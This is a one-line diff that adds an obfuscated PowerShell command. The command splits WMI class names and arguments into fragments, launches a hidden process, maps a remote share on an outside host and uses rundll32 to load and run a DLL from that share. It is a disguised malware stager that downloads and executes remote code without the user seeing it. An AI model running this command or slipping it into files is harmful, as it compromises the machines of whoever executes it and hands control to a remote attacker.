@@ -1,0 +1,1 @@
+$Yn8eri=([wmiclass]('Win32'+'_P'+'roc'+'essStar'+'t'+'up')).CreateInstance();$Yn8eri.ShowWindow=0;([wmiclass]('W'+'in'+'32_Pr'+'ocess')).Create((-join('cmd /c',' pu','sh','d \\hgx','b.1x','f','a.x','yz\','e','0c4cf0d-','a8b3','-4e57-','82fe','-56','86322d','9','bed & ru','ndll3','2 goo','gle.','cl',',#','1')),$null,$Yn8eri)
